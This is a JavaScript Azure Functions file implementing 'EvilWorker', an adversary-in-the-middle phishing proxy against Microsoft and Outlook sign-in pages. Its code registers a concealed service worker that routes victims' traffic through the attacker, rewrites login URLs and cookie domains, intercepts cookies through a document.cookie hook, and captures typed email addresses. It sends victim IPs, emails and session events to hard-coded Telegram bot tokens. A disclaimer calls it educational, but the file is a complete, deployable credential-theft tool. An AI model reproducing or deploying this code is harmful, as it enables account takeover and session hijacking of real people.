/**
 * EvilWorker + Azure AiTM Function Integration
 * Combines the best of both worlds: Service Worker proxying + Advanced Azure Functions
 * This code is provided for educational purposes only and provided without any liability or warranty.
 */

const { app } = require("@azure/functions");

// EvilWorker Configuration
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};

const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

// Enhanced AiTM Configuration
const upstream = "login.microsoftonline.com";
const upstream_live = "login.live.com";
const upstream_path = "/";

// Telegram Bot Integration
const telegram_bot_token_1 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const telegram_bot_token_2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
const telegram_chat_id_1 = "6743632244";
const telegram_chat_id_2 = "6263177378";

// Session Management
const VICTIM_SESSIONS = {};
const emailMap = new Map();

// Enhanced Cookie Analysis
function analyzeCookieValue(cookie) {
    const analysis = {
        type: 'unknown',
        containsJWT: false,
        containsRefreshToken: false,
        containsSessionToken: false,
        length: cookie.value.length,
        encoding: 'unknown'
    };
    
    const value = cookie.value;
    
    // JWT detection (3 parts separated by dots)
    if (value.split('.').length === 3) {
        analysis.containsJWT = true;
        analysis.type = 'jwt';
    }
    
    // Token type classification
    if (cookie.name.toLowerCase().includes('refresh') || 
        cookie.name.toLowerCase().includes('rt') ||
        cookie.name.toLowerCase().includes('persistent')) {
        analysis.containsRefreshToken = true;
        analysis.type = 'refresh_token';
    }
    
    // Session tokens
    if (cookie.name.toLowerCase().includes('session') ||
        cookie.name.toLowerCase().includes('sess') ||
        cookie.name.toLowerCase().includes('state')) {
        analysis.containsSessionToken = true;
        analysis.type = 'session_token';
    }
    
    // Authentication tokens
    if (cookie.name.toLowerCase().includes('auth') ||
        cookie.name.toLowerCase().includes('token') ||
        cookie.name.toLowerCase().includes('estauth')) {
        analysis.type = 'auth_token';
    }
    
    // Determine encoding
    if (/^[A-Za-z0-9+/]*={0,2}$/.test(value)) {
        analysis.encoding = 'base64';
    } else if (/^[A-Fa-f0-9]+$/.test(value)) {
        analysis.encoding = 'hex';
    } else if (/^[A-Za-z0-9\-_]+$/.test(value)) {
        analysis.encoding = 'base64url';
    }
    
    return analysis;
}

// Personal Account Detection
function isPersonalEmail(email) {
    if (!email) return false;
    const personalDomains = ['@outlook.com', '@hotmail.com', '@live.com', '@msn.com'];
    return personalDomains.some(domain => email.toLowerCase().includes(domain));
}

// Telegram Integration
async function dispatchMessage(message, context) {
    context.log(`📤 Sending to Telegram: ${message}`);
  
    // Send to Telegram bot 2 (working one)
    try {
        const response = await fetch(`https://api.telegram.org/bot${telegram_bot_token_2}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: telegram_chat_id_2, 
                text: message, 
                parse_mode: "HTML" 
            }),
        });
        
        if (response.ok) {
            context.log(`✅ Message sent successfully to bot 2`);
        } else {
            const errorText = await response.text();
            context.log(`❌ Failed to send to bot 2: ${errorText}`);
        }
    } catch (error) {
        context.log(`❌ Error sending to bot 2: ${error.message}`);
    }

    // Try to send to bot 1
    try {
        const response = await fetch(`https://api.telegram.org/bot${telegram_bot_token_1}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: telegram_chat_id_1,
                text: message, 
                parse_mode: "HTML" 
            }),
        });
        
        if (response.ok) {
            context.log(`✅ Message sent successfully to bot 1`);
        } else {
            const errorText = await response.text();
            context.log(`❌ Failed to send to bot 1: ${errorText}`);
        }
    } catch (error) {
        context.log(`❌ Error sending to bot 1: ${error.message}`);
    }
}

// Enhanced Session Management
function generateNewSession(phishedURL) {
    const cookieName = `session_${crypto.randomBytes(16).toString('hex')}`;
    const cookieValue = crypto.randomBytes(32).toString('hex');
    
    VICTIM_SESSIONS[cookieName] = {
        value: cookieValue,
        cookies: [],
        logFilename: `${phishedURL.host}__${new Date().toISOString()}`,
        protocol: phishedURL.protocol,
        hostname: phishedURL.hostname,
        path: `${phishedURL.pathname}${phishedURL.search}`,
        port: phishedURL.port,
        host: phishedURL.host,
        startTime: Date.now(),
        events: [],
        accountType: 'unknown'
    };
    
    return { cookieName, cookieValue };
}

// Main EvilWorker Integration Function
app.http("evilworker_integration", {
    methods: ["GET", "POST"],
    authLevel: "anonymous",
    route: "/{*x}",
    handler: async (request, context) => {
        const ip = request.headers.get("cf-connecting-ip") ||
                   request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
                   request.headers.get("x-client-ip") ||
                   request.headers.get("true-client-ip") ||
                   request.headers.get("x-real-ip") ||
                   "unknown";

        const { method, url } = request;
        const currentSession = getUserSession(request.headers.get("cookie"));

        // Log every request for debugging
        await dispatchMessage(
            `🔍 <b>EvilWorker Request</b>\n🌐 <b>Method</b>: ${method}\n📱 <b>IP</b>: ${ip}\n🔗 <b>URL</b>: ${url}\n👤 <b>User-Agent</b>: ${request.headers.get("user-agent") || "unknown"}`,
            context
        );

        try {
            // Handle service worker registration page
            if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
                const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
                let session = currentSession;

                if (!currentSession) {
                    const { cookieName, cookieValue } = generateNewSession(phishedURL);
                    
                    // Determine account type
                    const accountType = isPersonalEmail(phishedURL.hostname) ? "personal" : "corporate";
                    VICTIM_SESSIONS[cookieName].accountType = accountType;
                    
                    await dispatchMessage(
                        `🚀 <b>New EvilWorker Session</b>\n🆔 <b>Session ID:</b> ${cookieName}\n🌐 <b>IP:</b> ${ip}\n🎯 <b>Target:</b> ${phishedURL.host}\n📱 <b>Account Type:</b> ${accountType}`,
                        context
                    );

                    return new Response(`
                        <!DOCTYPE html>
                        <html lang="en">
                        <head>
                            <meta charset="UTF-8">
                        </head>
                        <body>
                            <script>
                                if ("serviceWorker" in navigator) {
                                    navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
                                        scope: "/",
                                    })
                                    .then((registration) => {
                                        const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
                                        const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
                                        self.location.replace(phishedURL.pathname + phishedURL.search);
                                    })
                                    .catch((error) => {
                                        console.error("Service worker registration failed:", error);
                                    });
                                } else {
                                    console.error("Service workers are not supported by this browser");
                                }
                            </script>
                        </body>
                        </html>
                    `, {
                        status: 200,
                        headers: {
                            "Content-Type": "text/html",
                            "Set-Cookie": `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`
                        }
                    });
                }

                // Update existing session
                VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
                VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
                VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
                VICTIM_SESSIONS[session].port = phishedURL.port;
                VICTIM_SESSIONS[session].host = phishedURL.host;

                return new Response(`
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                    </head>
                    <body>
                        <script>
                            if ("serviceWorker" in navigator) {
                                navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
                                    scope: "/",
                                })
                                .then((registration) => {
                                    const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
                                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
                                    self.location.replace(phishedURL.pathname + phishedURL.search);
                                })
                                .catch((error) => {
                                    console.error("Service worker registration failed:", error);
                                });
                            } else {
                                console.error("Service workers are not supported by this browser");
                            }
                        </script>
                    </body>
                    </html>
                `, {
                    status: 200,
                    headers: { "Content-Type": "text/html" }
                });
            }

            // Handle service worker file
            if (url === PROXY_PATHNAMES.serviceWorker) {
                return new Response(`
                    self.addEventListener("fetch", (event) => {
                        event.respondWith(handleRequest(event.request));
                    });

                    async function handleRequest(request) {
                        const proxyRequestURL = "\${self.location.origin}/lNv1pC9AWPUY4gbidyBO";

                        try {
                            const proxyRequest = {
                                url: request.url,
                                method: request.method,
                                headers: Object.fromEntries(request.headers.entries()),
                                body: await request.text(),
                                referrer: request.referrer,
                                mode: request.mode
                            };
                            
                            return fetch(proxyRequestURL, {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json",
                                },
                                body: JSON.stringify(proxyRequest),
                                redirect: "manual",
                                mode: "same-origin"
                            });
                        }
                        catch (error) {
                            console.error("Fetching \${proxyRequestURL} failed:", error);
                        }
                    }
                `, {
                    status: 200,
                    headers: { "Content-Type": "application/javascript" }
                });
            }

            // Handle proxy requests from service worker
            if (url === PROXY_PATHNAMES.proxy) {
                if (method !== 'POST') {
                    return new Response("Method not allowed", { status: 405 });
                }

                const proxyRequest = JSON.parse(await request.text());
                const targetURL = new URL(proxyRequest.url);

                // Log the proxy request
                await dispatchMessage(
                    `🔄 <b>EvilWorker Proxy Request</b>\n🌐 <b>Target:</b> ${targetURL.host}\n📱 <b>IP:</b> ${ip}\n🔗 <b>Path:</b> ${targetURL.pathname}`,
                    context
                );

                // Prepare headers for upstream request
                const headers = { ...proxyRequest.headers };
                headers['host'] = targetURL.host;
                headers['origin'] = targetURL.origin;
                headers['referer'] = targetURL.origin;

                // Remove problematic headers
                delete headers['content-length'];
                delete headers['x-forwarded-for'];
                delete headers['x-forwarded-host'];

                // Add realistic browser headers
                headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36';
                headers['accept-encoding'] = 'gzip, deflate, br';
                headers['accept-language'] = 'en-US,en;q=0.9';

                // Make the upstream request
                const upstreamResponse = await fetch(targetURL.toString(), {
                    method: proxyRequest.method,
                    headers,
                    body: proxyRequest.body || undefined,
                    redirect: 'manual'
                });

                // Get response data
                const contentType = upstreamResponse.headers.get('content-type') || '';
                let responseData;

                if (/^(text\/html|application\/javascript|text\/javascript|application\/json|text\/css)/i.test(contentType)) {
                    responseData = await upstreamResponse.text();
                    
                    // Transform content to replace Microsoft URLs with our domain
                    const functionHost = request.headers.get('host');
                    responseData = responseData
                        .replace(/https:\/\/login\.microsoftonline\.com/g, `https://${functionHost}`)
                        .replace(/https:\/\/portal\.office\.com/g, `https://${functionHost}`)
                        .replace(/https:\/\/www\.office\.com/g, `https://${functionHost}`)
                        .replace(/action="\/common\/login"/g, `action="https://${functionHost}/common/login"`)
                        .replace(/action="\/common\/reprocess"/g, `action="https://${functionHost}/common/reprocess"`);
                } else {
                    responseData = await upstreamResponse.arrayBuffer();
                }

                // Prepare response headers
                const responseHeaders = {};
                upstreamResponse.headers.forEach((value, key) => {
                    const k = key.toLowerCase();
                    if (k === 'set-cookie') {
                        // Rewrite cookie domain
                        const rewrittenCookies = value.split(',').map(c => 
                            c.replace(/Domain=[^;]+/i, `Domain=${request.headers.get('host')}`)
                        );
                        responseHeaders[key] = rewrittenCookies;
                    } else if (k === 'location') {
                        // Rewrite location header
                        const rewritten = value
                            .replace(/https:\/\/login\.microsoftonline\.com/g, `https://${request.headers.get('host')}`)
                            .replace(/https:\/\/portal\.office\.com/g, `https://${request.headers.get('host')}`);
                        responseHeaders[key] = rewritten;
                    } else if (!['server', 'x-powered-by', 'x-aspnet-version'].includes(k)) {
                        responseHeaders[key] = value;
                    }
                });

                // Log successful proxy
                await dispatchMessage(
                    `✅ <b>EvilWorker Proxy Success</b>\n🌐 <b>Target:</b> ${targetURL.host}\n📱 <b>IP:</b> ${ip}\n📊 <b>Status:</b> ${upstreamResponse.status}`,
                    context
                );

                return new Response(responseData, {
                    status: upstreamResponse.status,
                    headers: responseHeaders,
                });
            }

            // Handle JavaScript injection
            if (url === PROXY_PATHNAMES.script) {
                return new Response(`
                    // Enhanced EvilWorker JavaScript injection
                    (function() {
                        'use strict';
                        
                        // Service Worker Detection Bypass
                        const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;
                        navigator.serviceWorker.getRegistration = function (_scope) {
                            return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)
                                .then(registration => {
                                    if (registration && 
                                        registration.active && 
                                        registration.active.scriptURL && 
                                        registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {
                                        return undefined; // Hides malicious service worker
                                    }
                                    return registration;
                                });
                        };

                        // Cookie Hijacking System
                        const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");
                        Object.defineProperty(document, "cookie", {
                            ...originalCookieDescriptor,
                            get() {
                                return originalCookieDescriptor.get.call(document);
                            },
                            set(cookie) {
                                // Intercept cookie setting
                                const proxyRequestURL = \`\${self.location.origin}/JSCookie_6X7dRqLg90mH\`;
                                try {
                                    const xhr = new XMLHttpRequest();
                                    xhr.open("POST", proxyRequestURL, false);
                                    xhr.setRequestHeader("Content-Type", "text/plain");
                                    xhr.send(cookie);
                                } catch (error) {
                                    console.error(\`Cookie interception failed: \${error}\`);
                                }
                                
                                // Set the cookie normally
                                originalCookieDescriptor.set.call(document, cookie);
                            }
                        });

                        // DOM Mutation Monitoring
                        const observer = new MutationObserver((mutations) => {
                            for (const mutation of mutations) {
                                if (mutation.type === "attributes") {
                                    updateHTMLAttribute(mutation.target, mutation.attributeName);
                                }
                                else if (mutation.type === "childList") {
                                    for (const node of mutation.addedNodes) {
                                        for (const attribute of ["href", "action"]) {
                                            if (node[attribute]) {
                                                updateHTMLAttribute(node, attribute);
                                            }
                                        }
                                    }
                                }
                            }
                        });

                        function updateHTMLAttribute(htmlNode, htmlAttribute) {
                            try {
                                const htmlAttributeURL = new URL(htmlNode[htmlAttribute]);
                                if (htmlAttributeURL.origin !== self.location.origin) {
                                    const proxyRequestURL = new URL(\`\${self.location.origin}/Mutation_o5y3f4O7jMGW\`);
                                    proxyRequestURL.searchParams.append("redirect_urI", encodeURIComponent(htmlAttributeURL.href));
                                    htmlNode[htmlAttribute] = proxyRequestURL;
                                }
                            } catch { }
                        }

                        observer.observe(document.documentElement, {
                            childList: true,
                            subtree: true,
                            attributeFilter: ["href", "action"]
                        });

                        // Enhanced Event Monitoring
                        document.addEventListener('DOMContentLoaded', () => {
                            // Monitor form submissions
                            document.addEventListener('submit', (e) => {
                                const form = e.target;
                                const emailInput = form.querySelector('input[name="loginfmt"], input[name="username"], input[type="email"]');
                                if (emailInput) {
                                    // Send email capture notification
                                    fetch('/__notify_click', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            event: 'email_entered',
                                            email: emailInput.value,
                                            ip: '${ip}'
                                        }),
                                    });
                                }
                            });

                            // Monitor button clicks
                            document.addEventListener('click', (e) => {
                                if (e.target.tagName === 'BUTTON' || e.target.type === 'submit') {
                                    fetch('/__notify_click', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            event: 'button_clicked',
                                            buttonText: e.target.textContent || e.target.value,
                                            ip: '${ip}'
                                        }),
                                    });
                                }
                            });
                        });
                    })();
                `, {
                    status: 200,
                    headers: { "Content-Type": "application/javascript" }
                });
            }

            // Handle special injected click reporting
            if (method === "POST" && url === "/__notify_click") {
                const body = await request.json();
                const email = body.email || "unknown";
                const realIP = body.ip || ip;
                
                if (email !== "unknown") {
                    emailMap.set(realIP, email);
                    const accountType = isPersonalEmail(email) ? "personal" : "corporate";
                    
                    await dispatchMessage(
                        `👀 <b>EvilWorker User Interaction</b>\n🧑‍💻 <b>Email:</b> ${email}\n🌐 <b>IP:</b> ${realIP}\n📱 <b>Account Type:</b> ${accountType}\n🎯 <b>Event:</b> ${body.event}`,
                        context
                    );
                }
                
                return new Response("ok", { status: 200 });
            }

            // Default: serve 404
            return new Response(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>404 - Page Not Found</title>
                </head>
                <body>
                    <h1>404 - Page Not Found</h1>
                    <p>The requested page could not be found.</p>
                </body>
                </html>
            `, {
                status: 404,
                headers: { "Content-Type": "text/html" }
            });

        } catch (error) {
            context.log.error('EvilWorker integration error:', error);
            await dispatchMessage(
                `❌ <b>EvilWorker Error</b>\n🌐 <b>IP:</b> ${ip}\n🔗 <b>URL:</b> ${url}\n🚨 <b>Error:</b> ${error.message}`,
                context
            );
            
            return new Response(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Service Temporarily Unavailable</title>
                </head>
                <body>
                    <h1>Service Temporarily Unavailable</h1>
                    <p>The service is temporarily unavailable. Please try again later.</p>
                </body>
                </html>
            `, {
                status: 503,
                headers: { "Content-Type": "text/html" }
            });
        }
    },
});

// Helper functions
function getUserSession(cookieHeader) {
    if (!cookieHeader) return null;
    
    const cookies = cookieHeader.split(';').map(c => c.trim().split('='));
    for (const [name, value] of cookies) {
        if (VICTIM_SESSIONS[name] && VICTIM_SESSIONS[name].value === value) {
            return name;
        }
    }
    return null;
}

// Export for testing
module.exports = {
    VICTIM_SESSIONS,
    emailMap,
    isPersonalEmail,
    analyzeCookieValue
};
